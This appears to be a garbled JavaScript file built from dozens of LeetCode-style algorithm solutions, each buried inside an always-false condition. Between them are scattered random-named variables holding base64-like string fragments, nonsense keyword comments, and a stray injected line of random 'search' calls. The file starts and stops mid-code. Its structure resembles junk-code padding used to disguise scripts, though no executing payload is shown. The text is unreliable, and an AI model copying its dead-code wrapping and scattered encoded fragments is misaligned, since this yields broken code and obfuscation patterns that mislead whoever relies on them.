        mid;
    
    while (start < end) {
        mid = parseInt((start + end) / 2);
        
        if (nums[mid] < nums[start]) {
            end = mid;
        } else if (nums[end] < nums[mid]) {
            start = mid + 1;
        } else {
            return nums[start];
        }
    }
    
    return nums[start];
};

}

    var xqwvnhmnie = 'uUkdWMF';
    var hqdknnnoeq = 'agcgP';
    var nbedi = 'pXTj';
    var qltivttiu = 'ZlcBEn';
    var qhlrbyorit = 'BaV1F';
    var fznegloxab = 'CiMQaZBW';
if (Array.isArray(5)) {
    /**
Given two strings S and T, determine if they are both one edit distance apart
*/
/**
 * @param {string} s
 * @param {string} t
 * @return {boolean}
 */
var isOneEditDistance = function(s, t) {
    for (let i = 0; i < Math.min(s.length, t.length); i++) {
        if (s.charAt(i) !== t.charAt(i)) {
            if (s.length === t.length) {
                return s.substring(i + 1) === t.substring(i + 1);
            } else if (s.length < t.length) {
                return s.substring(i) === t.substring(i + 1);
            } else {
                return s.substring(i + 1) === t.substring(i);
            }
        }
    }
    
    return Math.abs(s.length - t.length) === 1;
};

}

    var ymkwujsazvf = 'nUF';
if ('b' === 'L') {
    /**
Given an integer array nums, return the number of range sums that lie in [lower, upper] inclusive.
Range sum S(i, j) is defined as the sum of the elements in nums between indices i and j (i ≤ j), inclusive.

Note:
A naive algorithm of O(n2) is trivial. You MUST do better than that.

Example:
Given nums = [-2, 5, -1], lower = -2, upper = 2,
Return 3.
The three ranges are : [0, 0], [2, 2], [0, 2] and their respective sums are: -2, -1, 2.
*/
/**
 * @param {number[]} nums
 * @param {number} lower
 * @param {number} upper
 * @return {number}
 */
var countRangeSum = function(nums, lower, upper) {
    function SegmentTreeNode(min, max) {
        this.min = min;
        this.max = max;
        this.count = 0;
    }
    
    function buildSegmentTree(valArr, low, high) {
        if (low > high) {
            return null;
        }
        
        var mid = parseInt((low + high) / 2),
            node = new SegmentTreeNode(valArr[low], valArr[high]);
        
        if (low === high) {
            return node;
        }
        
        node.left = buildSegmentTree(valArr, low, mid);
        node.right = buildSegmentTree(valArr, mid + 1, high);
        
        return node;
    }
    
    function updateSegmentTree(node, val) {
        if (!node) {
            return;
        }
        
        if (val >= node.min && val <= node.max) {
            node.count++;
            updateSegmentTree(node.left, val);
            updateSegmentTree(node.right, val);
        }
    }
    
    function rangeCount(node, min, max) {
        if (!node) {
            return 0;
        }
        
        if (min > node.max || max < node.min) {
            return 0;
        }
        
        if (min <= node.min && max >= node.max) {
            return node.count;
        }
        
        return rangeCount(node.left, min, max) + rangeCount(node.right, min, max);
    }
    
    var len = nums.length,
        sumSet = new Set(),
        sum = 0,
        result = 0,
        arr,
        root,
        i;
        
    if (len === 0) {
        return 0;
    }
    
    for (i = 0; i < len; i++) {
        sum += nums[i];
        sumSet.add(sum);
    }
    
    arr = Array.from(sumSet);
    arr.sort(function(a, b) {
        return a - b;
    });
    
    root = buildSegmentTree(arr, 0, arr.length - 1);
    
    for (i = len - 1; i >= 0; i--) {
        updateSegmentTree(root, sum);
        sum -= nums[i];
        result += rangeCount(root, lower + sum, upper + sum);
    }
    
    return result;
};

}

    var imzwcfzqubb = 'oFQAISKYr';
if (2 instanceof String) {
    /**
You are given a string, s, and a list of words, words, that are all of the same length. Find all starting indices of substring(s) in s that is a concatenation of each word in words exactly once and without any intervening characters.

For example, given:
s: "barfoothefoobarman"
words: ["foo", "bar"]

You should return the indices: [0,9].
(order does not matter).
*/
/**
 * @param {string} s
 * @param {string[]} words
 * @return {number[]}
 */
 
 // TIME LIMIT EXCEEDED...
var findSubstring = function(s, words) {
    var len = s.length,
        wordsLen = words.length,
        wordLen = words[0].length,
        i,
        j,
        m,
        temp,
        toFound = {},
        found = {},
        result = [];
        
    for (i = 0; i < wordsLen; i++) {
        if (!toFound[words[i]]) {
            toFound[words[i]] = 1; 
        } else {
            toFound[words[i]]++;
        }
    }
    
    for (i = 0; i < len; i++) {
        found = {};
        j = i;
        for (m = 0; m < wordsLen; m++) {
            temp = s.slice(j, j + wordLen);
            
            if (!toFound[temp]) {
                break;
            }
            
            if (toFound[temp]) {
                if (!found[temp]) {
                    found[temp] = 1;
                } else {
                    found[temp]++;
                }
            }
            
            if (found[temp] > toFound[temp]) {
                break;
            }
            
            j += wordLen;
        }
        
        if (m === wordsLen) {
            result.push(i);
        }
    }
    
    return result;
};

}

// array script await
    var fmvhsibmg = 'DSfKIeA';
    var zwnhtio = 'NCMGNu';
    var exotweg = 'yyFv';
    var lxrlm = 'VmxPd29nS';
if (null === 3) {
    /**
Suppose a sorted array is rotated at some pivot unknown to you beforehand.

(i.e., 0 1 2 4 5 6 7 might become 4 5 6 7 0 1 2).

You are given a target value to search. If found in the array return its index, otherwise return -1.

You may assume no duplicate exists in the array.
*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {number}
 */
var search = function(nums, target) {
    var len = nums.length,
        start = 0,
        end = len - 1,
        mid;
        
    while (start <= end) {
        mid = Math.floor((start + end) / 2);
        
        if (nums[mid] === target) {
            return mid;
        } else if (nums[start] <= nums[mid]) {// left side sorted
            if (nums[mid] > target && nums[start] <= target) {
                // nums[mid] !== target, can safely do end = mid - 1
                end = mid - 1;
            } else {
                start = mid + 1;
            }
        } else { // right side sorted
            if (nums[mid] < target && nums[end] >= target) {
                // nums[mid] !== target, can safely do start = mid + 1
                start = mid + 1;
            } else {
                end = mid - 1;
            }
        }
    }
    
    return -1;
};

}

    var nmdwdxnugigm = 'MirSj';
    var ggaxeymwwbyq = 'UNB';
if (typeof navigator === 'undefined') {
    // TODO: optimize
/**
 * @param {number} n
 * @return {string[]}
 */
var generateParenthesis = function(n) {
    var i = 1,
        result = [];
    
    if (n === 0) {
        return result;
    }
    
    result.push('()');
    
    while (i < n) {
        result = helper(result);
        i++;
    }
    
    return result;
};

function helper(arr) {
    var len = arr.length,
        result = [],
        len1,
        curStr,
        tmp,
        i,
        j;
        
    len1 = arr[0].length;
    
    for (i = 0; i < len; i++) {
        curStr = arr[i];
        
        for (j = 0; j < len1; j++) {
            tmp = curStr.substring(0, j) + '()' + curStr.substring(j);
            
            if (result.indexOf(tmp) === -1) {
                result.push(tmp);
            }
        }
    }
    
    return result;
}

}

    var epkxuuolj = 'gMIK';
    var yzmpzyimqejomou = 'Z0lD';
if (!true && 1) {
    /**
Sort a linked list using insertion sort.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var insertionSortList = function(head) {
    var dummy = new ListNode(0),
        pre = dummy,
        cur = head,
        next;
        
    while(cur !== null) {
        next = cur.next;
        pre = dummy;
        
        while (pre.next && pre.next.val <= cur.val) {
            pre = pre.next;
        }
        
        cur.next = pre.next;
        pre.next = cur;
        cur = next;
    }
    
    return dummy.next;
};

}

    var oactpxyybtgc = 'sgZnb';
if (Array.isArray(8)) {
    /**
A strobogrammatic number is a number that looks the same when rotated 180 degrees (looked at upside down).

Write a function to determine if a number is strobogrammatic. The number is represented as a string.

For example, the numbers "69", "88", and "818" are all strobogrammatic.
*/
/**
 * @param {string} num
 * @return {boolean}
 */
var isStrobogrammatic = function(num) {
    let map = new Map();
    
    map.set('1', '1');
    map.set('6', '9');
    map.set('9', '6');
    map.set('8', '8');
    map.set('0', '0');
    
    let start = 0;
    let end = num.length - 1;
    
    while (start <= end) {
        if (!map.has(num.charAt(start)) || map.get(num.charAt(start)) !== num.charAt(end)) {
            return false;
        }
        
        start++;
        end--;
    }
    
    return true;
};

}

    var tnaafvuaytduwe = 'QWdJQ0FnS';
    var kowqewlae = 'VmVHpSVOvy';
if (6 instanceof String) {
    /**
Given a collection of numbers that might contain duplicates, return all possible unique permutations.

For example,
[1,1,2] have the following unique permutations:
[1,1,2], [1,2,1], and [2,1,1].
*/
/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var permuteUnique = function(nums) {
    var len = nums.length,
        result = [];
    
    nums.sort(function(a, b) {
        return a - b;
    });
    
    genPerm(result, 0, len, [], [], nums);
    
    return result;
};

function genPerm(result, index, len, curArr, used, nums) {
    if (curArr.length === len) {
        result.push(curArr);
        return;
    }
    
    var i;
    
    for (i = 0; i < len; i++) {
        if (used[i] || (i > 0 && nums[i] === nums[i - 1] && !used[i - 1])) {
            continue;
        }
        
        curArr.push(nums[i]);
        used[i] = true;
        genPerm(result, i + 1, len, curArr.concat(), used.concat(), nums);
        used[i] = false;
        curArr.pop();
    }
}
}

// array ighvkwa async vkmjf export debug return import async
if (0.48 && false) {
    /**
Given an array of meeting time intervals consisting of start and end times [[s1,e1],[s2,e2],...] (si < ei), find the minimum number of conference rooms required.

For example,
Given [[0, 30],[5, 10],[15, 20]],
return 2. 
*/
/**
 * Definition for an interval.
 * function Interval(start, end) {
 *     this.start = start;
 *     this.end = end;
 * }
 */
/**
 * @param {Interval[]} intervals
 * @return {number}
 */
var minMeetingRooms = function(intervals) {
    let start = [];
    let end = [];
    let len = intervals.length;
    
    for (let i = 0; i < len; i++) {
        start[i] = intervals[i].start;
        end[i] = intervals[i].end;
    }
    
    start.sort((a, b) => a - b);
    end.sort((a, b) => a - b);
    
    let rooms = 0;
    let endIndex = 0;
    
    for (let i = 0; i < len; i++) {
        if (start[i] < end[endIndex]) {
            rooms++;
        } else {
            endIndex++;
        }
    }
    
    return rooms;
};

}

    var dslawbjg = 'kkXiUq';
if (typeof document === 'undefined') {
    /**
Follow up for "Remove Duplicates":
What if duplicates are allowed at most twice?

For example,
Given sorted array nums = [1,1,1,2,2,3],

Your function should return length = 5, with the first five elements of nums being 1, 1, 2, 2 and 3. It doesn't matter what you leave beyond the new length.
*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var removeDuplicates = function(nums) {
    var duplicate = false,
        len = nums.length,
        index = 1,
        i;
    
    for (i = 1; i < len; i++) {
        if (duplicate && nums[i] === nums[i - 1]) {
            continue;
        }
        
        if (nums[i] === nums[i - 1]) {
            duplicate = true;
        } else {
            duplicate = false;
        }
        
        nums[index] = nums[i];
        index++;
    }
    
    return index;
};

}

    var kygbqek = 'UNCa1pXSj';
if ('b' === 'J') {
    /**
 *Reverse a linked list from position m to n. Do it in-place and in one-pass.

For example:
Given 1->2->3->4->5->NULL, m = 2 and n = 4,

return 1->4->3->2->5->NULL.

Note:
Given m, n satisfy the following condition:
1 ≤ m ≤ n ≤ length of list.
 *
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */

/**
Reverse a linked list from position m to n. Do it in-place and in one-pass.

For example:
Given 1->2->3->4->5->NULL, m = 2 and n = 4,

return 1->4->3->2->5->NULL.

Note:
Given m, n satisfy the following condition:
1 ≤ m ≤ n ≤ length of list.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */

/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var reverseBetween = function(head, m, n) {
    var dummy = new ListNode(0),
        newTail,
        prev,
        cur = dummy,
        next,
        i;
        
    if (m === n || head === null || head.next === null) {
        return head;
    }
    dummy.next = head;
    i = m - 1;
    
    while (i > 0) {
        cur = cur.next;
        i--;
    }
    
    prev = cur;
    cur = cur.next;
    newTail = prev.next;
    
    prev.next = null;
    i = n - m;
    
    while (cur && i >= 0) {
        next = cur.next;
        cur.next = prev.next;
        prev.next = cur;
        cur = next;
        i--;
    }
    
    newTail.next = next;
    return dummy.next;
    
};

}

    var tqviyotjlf = 'zvAl';
    var phfyzeauyktq = 'FaMmRsY2xS';
    var xmnxvkgrir = 'DNVcSONF';
// lkyntlv function string hqngss script value import array return variable
    var nfcgxzwo = 'AJlMnAiDu';
if (3 instanceof String) {
    /**
Given a linked list, swap every two adjacent nodes and return its head.

For example,
Given 1->2->3->4, you should return the list as 2->1->4->3.

Your algorithm should use only constant space. You may not modify the values in the list, only nodes itself can be changed.
*/

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var swapPairs = function(head) {
    if (head === null) {
        return null;
    }
    
    var next = head.next,
        result = next? next : head,
        prevTail,
        curHead,
        nextHead;
    
    curHead = head;

    while(next) {
        nextHead = next.next;
        
        if (prevTail) {
            prevTail.next = next;
        }
        
        next.next = curHead;
        curHead.next = nextHead;
        prevTail = curHead;
        
        curHead = nextHead;
        next = curHead && curHead.next;
    }
    
    return result;
};

}

    var nxwfkemy = 'eWF';
    var ilsepzniwhi = 'HtBTZs';
    var zkorogxdyln = 'XZG5aWEps';
    var rdvqhsnqx = 'lBdbsGTCL';
if ('k' === 'Z') {
    /**
Given a string s consists of upper/lower-case alphabets and empty space characters ' ', return the length of last word in the string.

If the last word does not exist, return 0.

Note: A word is defined as a character sequence consists of non-space characters only.

For example, 
Given s = "Hello World",
return 5.
*/

/**
 * @param {string} s
 * @return {number}
 */
var lengthOfLastWord = function(s) {
    var arr = s.split(' '),
        len = arr.length,
        i;
    
    for (i = len - 1; i >= 0; i--) {
        if (arr[i] !== '' && arr[i] !== ' ') {
            return arr[i].length;
        }
    }
    
    return 0;  
};

}

    var umuqe = 'WkNB';
if ('c' === 'L') {
    /**
 * @param {number} n
 * @return {number}
 * 
 * 我们知道，每当灯泡会改变状态，也就是 toggle 时，是因为它出现在了某个数的整数倍上。

对于第1个灯泡：1*1，会改变1次状态，即 off -》on

对于第2个灯泡：1*2，2*1，会改变2次状态，即 off -》on -》off

对于第3个灯泡：1*3，3*1，会改变2次状态，即 off -》on -》off

对于第4个灯泡：1*4，2*2，4*1，会改变3次状态，即 off -》on -》off -》on

……

会发现，每当我找到一个数的整数倍，总会找到对称的一个整数倍，例如 1*2，就肯定会有一个 2*1。唯一的例外出现在平方数上，例如 4 = 2*2，只有一次整数倍。

每次作为偶数次整数倍，最终的灯泡都会还原为 off；只有作为奇数次整数倍，最终的灯泡都会 on。
也就是说，最终亮的灯泡数目由小于其的最大平方数确定。
 * 
 */
var bulbSwitch = function(n) {
    return Math.floor(Math.sqrt(n));
};

}

    var vnpxkm = 'TdTaBcf';
    var rzgwcahbzygrfve = 'OUlIUnl';
    var tjsaceoupilf = 'LLdxgIv';
    var thdofsyw = 'kV1U';
    var tkxrwmggflv = 'yDZmgk';
    var laicwacb = '3Q2lBZ0l';
    var rshbpwrde = 'sICUMRHMM';
    var xdslfndgfd = 'DQWdJQ0Fn';
    var rzqirdppcsot = 'idsYlRgpWd';
    var jscqmfgidzfmt = 'SUNBZ0l';
if (9 === 19) {
    /**
Given a singly linked list L: L0→L1→…→Ln-1→Ln,
reorder it to: L0→Ln→L1→Ln-1→L2→Ln-2→…

You must do this in-place without altering the nodes' values.

For example,
Given {1,2,3,4}, reorder it to {1,4,2,3}.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {void} Do not return anything, modify head in-place instead.
 */
var reorderList = function(head) {
    var fast = head,
        slow = head,
        next1,
        next2,
        midHead;
    
    if (!head || !head.next) {
        return;
    }  
    
    while (fast && fast.next) {
        fast = fast.next.next;
        slow = slow.next;
    }
    
    if (fast) {
        midHead = reverse(slow.next);
    } else {
        midHead = reverse(slow);
    }
    
    fast = head;
    slow = midHead;
    
    while(fast && slow) {
        next1 = fast.next;
        next2 = slow.next;
        
        slow.next = fast.next;
        fast.next = slow;
        
        fast = next1;
        slow = next2;
    }
    
    if (fast) {
        fast.next = null;
    }
};

function reverse(head) {
    var dummyNode = new ListNode(0),
        prev = dummyNode,
        node,
        next;
        
    dummyNode.next = head;
    
    node = head.next;
    head.next = null;
    
    while (node) {
        next = node.next;
        node.next = prev.next;
        prev.next = node;

        node = next;
    }
    
    return dummyNode.next;
}

}

    var soiejssueg = 'TNnqjsWStf';
if ('true' === true) {
    /**
Given a pattern and a string str, find if str follows the same pattern.

Here follow means a full match, such that there is a bijection between a letter in pattern and a non-empty word in str.

Examples:
pattern = "abba", str = "dog cat cat dog" should return true.
pattern = "abba", str = "dog cat cat fish" should return false.
pattern = "aaaa", str = "dog cat cat dog" should return false.
pattern = "abba", str = "dog dog dog dog" should return false.
Notes:
You may assume pattern contains only lowercase letters, and str contains lowercase letters separated by a single space.
*/

/**
 * @param {string} pattern
 * @param {string} str
 * @return {boolean}
 */
var wordPattern = function(pattern, str) {
    var arr = str.split(' '),
        len = arr.length,
        map1 = {},
        map2 = {},
        curChar,
        curString,
        i;
    
    if (pattern.length !== len) {
        return false;
    }
    
    for (i = 0; i < len; i++) {
        curChar = pattern.charAt(i);
        curString = arr[i];
        
        if (!map1.hasOwnProperty(curChar) && !map2.hasOwnProperty(curString)) {
            map1[curChar] = curString;
            map2[curString] = curChar;
        } else if (map1[curChar] !== curString || map2[curString] !== curChar) {
            return false;
        }
    }
    
    return true;
};

}

    var iehzftegmtxnee = 'IZHB';
if (null === 3) {
    /**
The count-and-say sequence is the sequence of integers beginning as follows:
1, 11, 21, 1211, 111221, ...

1 is read off as "one 1" or 11.
11 is read off as "two 1s" or 21.
21 is read off as "one 2, then one 1" or 1211.
Given an integer n, generate the nth sequence.

Note: The sequence of integers will be represented as a string.

 * @param {number} n
 * @return {string}
 */
var countAndSay = function(n) {
    function interpret(s, accum, sum) {
        var times = 1,
            num,
            len = s.length,
            i,
            result = '';
        
        num = s.charAt(0);
        
        for (i = 1; i < len; i++) {
            if (s.charAt(i) !== num) {
                result += times + num;
                num = s.charAt(i);
                times = 1;
            } else {
                times++;
            }
        }
        if (accum === 1) {
            result = '1';
        } else {
            result += times + num;
        }
        if (accum === sum) {
            return result;
        } else {
            return interpret(result, accum + 1, sum);
        }
    }
    return interpret('1', 1, n);
};

}

    var zamyastvw = 'smmdLln';
if (null === 0) {
    /**
Given a collection of integers that might contain duplicates, nums, return all possible subsets.

Note:
Elements in a subset must be in non-descending order.
The solution set must not contain duplicate subsets.
For example,
If nums = [1,2,2], a solution is:

[
  [2],
  [1],
  [1,2,2],
  [2,2],
  [1,2],
  []
]
*/

/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var subsetsWithDup = function(nums) {
    var result = [],
        len = nums.length;
    
    nums.sort(function(a, b) {
        return a - b;
    });
    
    helper(nums, 0, len - 1, [], result);
    
    return result;
};

function helper(nums, start, end, curArr, result) {
    result.push(curArr);
    
    var i;
    
    for (i = start; i <= end; i++) {
        // skip duplicates
        if (i > start && nums[i] === nums[i - 1]) {
            continue;
        }
        curArr.push(nums[i]);
        helper(nums, i + 1, end, curArr.concat(), result);
        curArr.pop();
    }
}

}

    var virlvsbzn = 'ibVJ2Z';
    var swztvxdfq = 'SHfqh';
    var xlcohmlwq = 'Hk1c';
if (1 === 20) {
    /**
The thief has found himself a new place for his thievery again. There is only one entrance to this area, called the "root." Besides the root, each house has one and only one parent house. After a tour, the smart thief realized that "all houses in this place forms a binary tree". It will automatically contact the police if two directly-linked houses were broken into on the same night.

Determine the maximum amount of money the thief can rob tonight without alerting the police.

Example 1:
     3
    / \
   2   3
    \   \ 
     3   1
Maximum amount of money the thief can rob = 3 + 3 + 1 = 7.
Example 2:
     3
    / \
   4   5
  / \   \ 
 1   3   1
Maximum amount of money the thief can rob = 4 + 5 = 9.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number}
 */
var rob = function(root) {
    var result = dfsRob(root);
    
    return Math.max(result[0], result[1]);
};

// return an array to keep 2 values: 
// the maximum money when a root is selected and the maximum value when a root if NOT selected.
function dfsRob(root) {
    if (!root) {
        return [0, 0];
    }
    
    var left = dfsRob(root.left),
        right = dfsRob(root.right),
        includeRootVal,
        noRootVal;
    
    includeRootVal = left[1] + right[1] + root.val;
    noRootVal = Math.max(left[0], left[1]) + Math.max(right[0], right[1]);
    
    return [includeRootVal, noRootVal];
}

}

    var feinwttyk = 'pFwGKshY';
    var beyonkbbyhar = '2IyT';
    var mqerebgh = 'xzIWLrcbf';
// number object return
    var onxofcjv = 'bmnIwcv';
    var urgmbgqdxhc = 'mhkR';
    var tumhzbs = 'bSKsFd';
    var tbbxuchxfbkgck = '2x2Y';
    var uknhxawt = 'vjUizKMXfx';
// ashzjgqs compile dmnvcjmo array xpgfm variable dybxrd object import debug define
if (7 instanceof String) {
    /**
Given a complete binary tree, count the number of nodes.

Definition of a complete binary tree from Wikipedia:
In a complete binary tree every level, except possibly the last, is completely filled, and all nodes in the last level are as far left as possible. It can have between 1 and 2h nodes inclusive at the last level h.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number}
 */
var countNodes = function(root) {
    if (root === null) {
        return 0;
    }
    
    var tmp = root,
        totalDep = 0,
        nodeNumsInLastLevel = 0,
        node = root,
        curDep,
        depSplit;
    
    while (tmp) {
        tmp = tmp.left;
        totalDep++;
    }
    
    curDep = 1;
    while (curDep < totalDep) {
        depSplit = findSplit(node);
        
        if (depSplit + curDep === totalDep) {
            nodeNumsInLastLevel += Math.pow(2, depSplit - 1);
            node = node.right;
        } else {
            node = node.left;
        }
        
        curDep++;
    }
    
    return Math.pow(2, totalDep - 1) + nodeNumsInLastLevel;
};

// find the depth of left most node in right subtree of current node
// binary search in last level
function findSplit(root) {
    if (!root || !root.right) {
        return 0;
    }
    
    var dep = 0,
        tmp = root;
    
    tmp = tmp.right;
    while(tmp) {
        dep++;
        tmp = tmp.left;
    }
    
    return dep;
}

}

    var cmypid = 'VCmXj';
    var gpuomuyf = 'mk1';
if (0.01 && false) {
    /**
Given a binary tree, return the inorder traversal of its nodes' values.

For example:
Given binary tree {1,#,2,3},
   1
    \
     2
    /
   3
return [1,3,2].

Note: Recursive solution is trivial, could you do it iteratively?

 * Definition for binary tree
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * @param {TreeNode} root
 * @returns {number[]}
 */
var inorderTraversal = function(root) {
    var stack = [],
        result = [],
        cur;
    cur = root;
    while (stack.length > 0 || cur !== null) {
        if (cur !== null) {
            stack.push(cur);
            cur = cur.left;
        } else {
            cur = stack.pop();
            result.push(cur.val);
            cur = cur.right;
        }
    }
    return result;
};

}

    var kfovxjy = 'xDhby';
    var viitldrnvvo = 'eVpYQn';
if (!true && 1) {
    /**
Write a function to find the longest common prefix string amongst an array of strings.
*/
/**
 * @param {string[]} strs
 * @return {string}
 */
var longestCommonPrefix = function(strs) {
    var len = strs.length,
        len1,
        curChar,
        i,
        j;
    
    if (len === 0) {
        return '';
    }
    
    len1 = strs[0].length;
    for (i = 0; i < len1; i++) {
        curChar = strs[0].charAt(i);
        for (j = 1; j < len; j++) {
            if (strs[j].charAt(i) !== curChar) {
                return i === 0? '' : strs[0].substr(0, i);
            }
            
            if (strs[j].length === i) {
                return strs[j];
            }
        }
    }
    
    return strs[0];
};

}

    var owfpdx = 'cnbAUx';
    var gvtuifaaabaatsy = 'NZV0';
    var iwtijlvjw = 'VufP';
    var cejfzunkrnv = '5sS0N';
    var jjvgsxohhaj = 'YRXjW';
    var iabtcryp = 'kb2RIU';
    var psicqs = 'BpHOrZuX';
    var mfqrivetu = 'ndjem9';
if (Array.isArray(10)) {
    /**
Implement a trie with insert, search, and startsWith methods.

Note:
You may assume that all inputs are consist of lowercase letters a-z.
*/
/**
 * @constructor
 * Initialize your data structure here.
 */
 
 // MEMORY LIMIT EXCEEDED
var TrieNode = function() {
    var isEnd,
        links = {};
        
    return {
        containsKey: function(n) {
            return links[n] !== undefined;
        },
        get: function(ch) {
            return links[ch];
        },
        put: function(ch, node) {
            links[ch] = node;
        },
        setEnd: function() {
            isEnd = true;
        },
        isEnd: function() {
            return isEnd;
        }
    };
};

var Trie = function() {
    this.root = TrieNode();
};

/**
 * @param {string} word
 * @return {void}
 * Inserts a word into the trie.
 */
Trie.prototype.insert = function(word) {
    var len = word.length,
        node = this.root,
        ch,
        i;
        
    for (i = 0; i < len; i++) {
        ch = word.charAt(i);
        
        if (!node.containsKey(ch)) {
            node.put(ch, TrieNode());
        }
        
        node = node.get(ch);
    }
    
    node.setEnd();
};

/**
 * @param {string} word
 * @return {boolean}
 * Returns if the word is in the trie.
 */
Trie.prototype.search = function(word) {
    var node = this.searchPrefix(word);
    
    return node && node.isEnd();
};

/**
 * @param {string} prefix
 * @return {boolean}
 * Returns if there is any word in the trie
 * that starts with the given prefix.
 */
Trie.prototype.startsWith = function(prefix) {
    return this.searchPrefix(prefix) !== null;
};

Trie.prototype.searchPrefix = function(prefix) {
    var len = prefix.length,
        node = this.root,
        ch,
        i;
        
    for (i = 0; i < len; i++) {
        ch = prefix.charAt(i);
        
        if (!node.containsKey(ch)) {
            return null;
        }
        
        node = node.get(ch);
    }
    
    return node;
};

/**
 * Your Trie object will be instantiated and called as such:
 * var trie = new Trie();
 * trie.insert("somestring");
 * trie.search("key");
 */arch("theomachia"),search("roughy"),search("hypotarsal"),search("snooze"),search("pronominalize"),search("proselytist"),search("lingel")

}

    var szcdfjvgg = 'aljBUQw';
if (null === 1) {
    /**
Given an array S of n integers, find three integers in S such that the sum is closest to a given number, target. Return the sum of the three integers. You may assume that each input would have exactly one solution.

    For example, given array S = {-1 2 1 -4}, and target = 1.

    The sum that is closest to the target is 2. (-1 + 2 + 1 = 2).

*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {number}
 */
var threeSumClosest = function(nums, target) {
    var len = nums.length,
        minDiff = Number.MAX_VALUE,
        diff,
        left,
        right,
        i,
        j;
        
    nums.sort(function(a, b) {
        return a - b;
    });
    
    for (i = 0; i < len; i++) {
        left = i + 1;
        right = len - 1;
        
        while (left < right) {
            diff = target - nums[i] - nums[left] - nums[right];
            
            if (diff === 0) {
                return target;
            } else if (diff > 0) {
                left++;
            } else {
                right--;
            }
            
            if (Math.abs(diff) < Math.abs(minDiff)) {
                minDiff = diff;
            }
        }
    }
    
    return target - minDiff;
};

}

    var sumllanrxgmoe = '2TDJ';
    var lkmmtapfsac = 'ZAYxB';
// hello import
    var kstzqqhmcpi = 'zfIegyMYY';
    var fwovnonbezkt = 'Gal';
    var ofrlex = 'kEbRmik';
    var gefwkjnbeetbxjb = 'kyOTFib';
    var bvpijxgma = 'EkHniUDx';
    var pfxbbpewana = 'lJ6TG1k';
    var lavwyvg = 'tMNPVmeMA';
    var kmgnerowkznum = 'dmIyZH';
    var dirboo = 'NKyaUYT';
    var bresblty = 'NaUzV';
    var zmlghidcn = 'yrgpukBhe';
if ('l' === 'H') {
    /**
Given an unsorted array, find the maximum difference between the successive elements in its sorted form.

Try to solve it in linear time/space.

Return 0 if the array contains less than 2 elements.

You may assume all elements in the array are non-negative integers and fit in the 32-bit signed integer range.
*/

/**
 * @param {number[]} nums
 * @return {number}
 */
var maximumGap = function(nums) {
    var length = nums.length,
        bucket = [],
        max = Number.MIN_VALUE,
        min = Number.MAX_VALUE,
        gap = 0,
        bLen,
        bIndex,
        prev,
        i;
        
    if (length < 2) {
        return 0;
    }
    
    for (i = 0; i < length; i++) {
        if (nums[i] > max) {
            max = nums[i];
        }
        
        if (nums[i] < min) {
            min = nums[i];
        } 
    }
    
    // length of each bucket
    bLen = Math.floor((max - min) / length) + 1;
    
    for (i = 0; i < length; i++) {
        bIndex = Math.floor((nums[i] - min) / bLen);
        
        if (!bucket[bIndex]) {
            bucket[bIndex] = [];
            bucket[bIndex].push(nums[i]);
            bucket[bIndex].push(nums[i]);
        } else {
            if (nums[i] < bucket[bIndex][0]) {
                bucket[bIndex][0] = nums[i];
            } else if (nums[i] > bucket[bIndex][1]) {
                bucket[bIndex][1] = nums[i];
            }
        }
    }
    
    length = bucket.length;
    prev = 0;
    
    for (i = 1; i < length; i++) {
        if (!bucket[i]) {
            continue;
        }
        
        gap = Math.max(gap, bucket[i][0] - bucket[prev][1]);
        prev = i;
    }
    
    return gap;
};

}

    var adaawg = 'qYj';
if (Array.isArray(5)) {
    /**
Design and implement a data structure for Least Recently Used (LRU) cache. It should support the following operations: get and set.

get(key) - Get the value (will always be positive) of the key if the key exists in the cache, otherwise return -1.
set(key, value) - Set or insert the value if the key is not already present. When the cache reached its capacity, it should invalidate the least recently used item before inserting a new item.
*/
class Node {
    constructor(key, val) {
        this.key = key;
        this.val = val;
        this.next = null;
        this.prev = null;
    }
}
/**
 * @constructor
 */
var LRUCache = function(capacity) {
    this.list = null;
    this.map = new Map();
    this.head = null;
    this.tail = null;
    this.size = capacity;
    this.curSize = 0;
};

/**
 * @param {number} key
 * @returns {number}
 */
LRUCache.prototype.get = function(key) {
    if (!this.map.get(key)) {
        return -1;
    }
    
    let node = this.map.get(key);
    
    if (node === this.head) {
        return node.val;
    }
    
    // remove node from list
    if (node === this.tail) {
        this.tail.prev.next = null;
        this.tail = this.tail.prev;
    } else {
        node.prev.next = node.next;
        node.next.prev = node.prev;
    }
    
    // insert node to head
    node.next = this.head;
    this.head.prev = node;
    this.head = node;
    
    return node.val;
};

/**
 * @param {number} key
 * @param {number} value
 * @returns {void}
 */
LRUCache.prototype.set = function(key, value) {
    let newNode = new Node(key, value);
    
    if (this.curSize === 0) {
        this.head = newNode;
        this.tail = newNode;
        this.curSize++;
    } else {
        newNode.next = this.head;
        this.head.prev = newNode;
        this.head = newNode;
        this.curSize++;
    }
    
    // update
    if (this.map.get(key)) {
        let oldNode = this.map.get(key);
        
        if (oldNode === this.tail) {
            this.tail = this.tail.prev;
            this.tail.next = null;
        } else {
            oldNode.prev.next = oldNode.next;
            oldNode.next.prev = oldNode.prev;
        }
        
        this.curSize--;
        this.map.set(key, newNode);
    } else {
        if (this.curSize > this.size) {
            //delete tail
